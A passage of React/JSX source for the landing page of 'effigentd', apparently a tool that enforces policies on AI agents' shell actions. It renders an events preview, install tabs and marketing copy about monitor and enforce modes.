      <Section>
        <Reveal>
          <Eyebrow hue="250">The console</Eyebrow>
          <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 8px', maxWidth: 640 }}>One place for the rules and <b>the record</b>.</h2>
          <div style={{ fontSize: 15, color: 'var(--ink-2)', marginBottom: 36, maxWidth: 640 }}>
            Write a policy once, scope it to teams, agents or machines, and every enrolled endpoint picks it up. Each event says which rule decided it and at which policy version.
          </div>
          <div className="preview-grid" style={{ display: 'grid', gridTemplateColumns: '1.15fr 0.85fr', gap: 18, alignItems: 'stretch' }}>
            {/* events panel */}
            <div className="float-soft" style={{ borderRadius: 12, background: 'oklch(0.15 0.012 265)', border: '1px solid oklch(0.24 0.012 265)', overflow: 'hidden', boxShadow: '0 24px 60px -30px oklch(0.15 0.012 265 / 0.55)', minWidth: 0 }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '12px 16px', borderBottom: '1px solid oklch(0.22 0.012 265)' }}>
                <div style={{ fontSize: 12.5, fontWeight: 700, color: 'oklch(0.9 0.005 265)' }}>Events</div>
                <div style={{ fontFamily: 'var(--mono)', fontSize: 10, color: 'oklch(0.55 0.01 265)' }}>production · last 15 min</div>
              </div>
              <div style={{ padding: '6px 0' }}>
                {EVENTS.map(([time, outcome, agent, cls, target]) => {
                  const color = outcome === 'would' ? 'oklch(0.7 0.1 60)' : OUTCOME[outcome];
                  const label = outcome === 'would' ? 'would_block' : outcome === 'pending' ? 'pending' : outcome;
                  return (
                    <div key={time + target} className="ev-row" style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '9px 16px', borderBottom: '1px solid oklch(0.19 0.012 265)', fontSize: 11.5 }}>
                      <span style={{ fontFamily: 'var(--mono)', color: 'oklch(0.55 0.01 265)', width: 34, flexShrink: 0 }}>{time}</span>
                      <span style={{ fontSize: 9.5, fontWeight: 700, color, border: `1px solid ${color}`, borderRadius: 8, padding: '1px 7px', whiteSpace: 'nowrap', width: 78, textAlign: 'center', flexShrink: 0 }}>{label}</span>
                      <span style={{ fontFamily: 'var(--mono)', color: 'oklch(0.7 0.01 265)', width: 84, flexShrink: 0 }}>{agent}</span>
                      <span className="ev-target" style={{ fontFamily: 'var(--mono)', color: 'oklch(0.86 0.005 265)', flex: 1, minWidth: 0, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}><span style={{ color: 'oklch(0.55 0.01 265)' }}>{cls}</span> {target}</span>
                    </div>
                  );
                })}
              </div>
            </div>
            {/* policy panel */}
            <div className="float-soft" style={{ animationDelay: '0.8s', borderRadius: 12, background: 'oklch(0.15 0.012 265)', border: '1px solid oklch(0.24 0.012 265)', overflow: 'hidden', boxShadow: '0 24px 60px -30px oklch(0.15 0.012 265 / 0.55)', minWidth: 0 }}>
              <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '12px 16px', borderBottom: '1px solid oklch(0.22 0.012 265)' }}>
                <div style={{ fontSize: 12.5, fontWeight: 700, color: 'oklch(0.9 0.005 265)' }}>Policy · v42</div>
                <div style={{ fontFamily: 'var(--mono)', fontSize: 10, color: 'oklch(0.55 0.01 265)' }}>14 endpoints in scope</div>
              </div>
              <pre style={{ margin: 0, padding: '12px 16px', fontFamily: 'var(--mono)', fontSize: 11, lineHeight: 1.6, color: 'oklch(0.82 0.01 150)', overflowX: 'auto' }}>{POLICY_JSON}</pre>
            </div>
          </div>
        </Reveal>
      </Section>

      {/* INSTALL */}
      <Section id="install">
        <Reveal>
          <Eyebrow hue="250">Install</Eyebrow>
          <h2 className="h-serif" style={{ fontSize: 'clamp(26px, 6vw, 32px)', margin: '0 0 8px' }}>One daemon per machine. <b>No agent code changes.</b></h2>
          <div style={{ fontSize: 15, color: 'var(--ink-2)', marginBottom: 36, maxWidth: 620 }}>
            Enroll the machine with a token from the console. effigentd picks up agents already running, installs the hooks for the agents that have them, and starts in the mode your policy sets.
          </div>
          <div style={{ display: 'flex', gap: 4, borderBottom: '1px solid var(--line)', overflowX: 'auto' }} role="tablist">
            {installTabs.map((t) => (
              <button key={t.key} role="tab" aria-selected={tab === t.key} onClick={() => setTab(t.key)} style={{ padding: '10px 18px', fontSize: 13.5, fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap', background: 'transparent', border: 'none', fontFamily: 'var(--sans)', color: tab === t.key ? 'var(--ink)' : 'var(--ink-4)', borderBottom: tab === t.key ? '2px solid var(--ink)' : '2px solid transparent', marginBottom: -1 }}>{t.label}</button>
            ))}
          </div>
          <div className="install-code" style={{ background: 'oklch(0.16 0.012 260)', borderRadius: '0 0 8px 8px', padding: '26px 28px', fontFamily: 'var(--mono)', fontSize: 13.5, color: 'oklch(0.85 0.01 150)', lineHeight: 1.8, whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>{INSTALL_CODE[tab]}</div>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 14, marginTop: 22 }}>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px 18px', fontFamily: 'var(--mono)', fontSize: 12, color: 'var(--ink-3)' }}>
              {supportedAgents.map((h) => <span key={h}>{h}</span>)}
            </div>
            <Link href="/docs/quickstart" style={{ fontSize: 14, fontWeight: 600, color: 'oklch(0.4 0.14 250)' }}>Quickstart &rarr;</Link>
          </div>
        </Reveal>
      </Section>

      {/* POSITION */}
      <div className="manifesto-pad" style={{ position: 'relative', borderTop: '1px solid var(--line)', background: 'oklch(0.2 0.012 260)', padding: '100px 32px', overflow: 'hidden' }}>
        <div style={{ position: 'absolute', inset: 0, backgroundImage: 'radial-gradient(oklch(0.4 0.012 260 / 0.6) 1px, transparent 1px)', backgroundSize: '22px 22px', maskImage: 'radial-gradient(ellipse 60% 70% at 50% 50%, black 30%, transparent 100%)', WebkitMaskImage: 'radial-gradient(ellipse 60% 70% at 50% 50%, black 30%, transparent 100%)', pointerEvents: 'none' }} />
        <div style={{ position: 'relative', maxWidth: 780, margin: '0 auto', textAlign: 'center' }}>
          <div style={{ fontFamily: 'var(--mono)', fontSize: 12, color: 'oklch(0.6 0.01 260)', textTransform: 'uppercase', letterSpacing: '0.06em', marginBottom: 24 }}>Where the control sits</div>
          <div className="h-serif" style={{ fontSize: 'clamp(24px, 6.5vw, 36px)', lineHeight: 1.35, color: 'oklch(0.98 0.004 90)' }}>The decision belongs <b>on the machine</b>, before the exec, with a name next to every exception.</div>
          <div style={{ fontSize: 15, color: 'oklch(0.68 0.01 260)', marginTop: 28, maxWidth: 600, marginLeft: 'auto', marginRight: 'auto', lineHeight: 1.65 }}>Prompts and model calls are the wrong place to enforce what a shell may do. effigentd enforces where the action happens and tells you plainly where it can&apos;t.</div>
        </div>
      </div>

      {/* FOOTER CTA */}
      <div className="cta-pad" style={{ borderTop: '1px solid var(--line)', padding: '90px 32px', textAlign: 'center' }}>
        <Reveal>
          <div className="h-serif" style={{ fontSize: 'clamp(27px, 7vw, 34px)', marginBottom: 12 }}>Start in monitor mode. <b>Enforce when you&apos;re ready.</b></div>
          <div style={{ fontSize: 15, color: 'var(--ink-2)', marginBottom: 26, maxWidth: 560, marginLeft: 'auto', marginRight: 'auto' }}>
            Monitor reports what a policy would have blocked without blocking it, so you can see the effect on real work first.
          </div>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', flexWrap: 'wrap', gap: 14 }}>
            <Link href="/docs/quickstart" className="btn btn-primary" style={{ padding: '13px 26px', fontSize: 14.5, display: 'inline-block' }}>Enroll a machine</Link>
            <Link href="/security" className="btn btn-ghost" style={{ padding: '13px 22px', fontSize: 14.5, display: 'inline-block' }}>Security &amp; trust</Link>
          </div>
          <div style={{ display: 'flex', justifyContent: 'center', flexWrap: 'wrap', gap: '8px 18px', marginTop: 26, fontSize: 13, color: 'var(--ink-3)' }}>
            {['SOC 2 in progress', 'Data hosted in the US', 'Encrypted in transit and at rest', 'Tamper-evident audit trail', 'No source code or prompts collected'].map((t) => (
              <Link key={t} href="/security" style={{ display: 'inline-flex', alignItems: 'center', gap: 7 }}>
                <span style={{ width: 6, height: 6, borderRadius: '50%', background: 'oklch(0.6 0.15 150)' }} />{t}
              </Link>
            ))}
          </div>
        </Reveal>
      </div>

      <Footer />
    </div>
  );
}
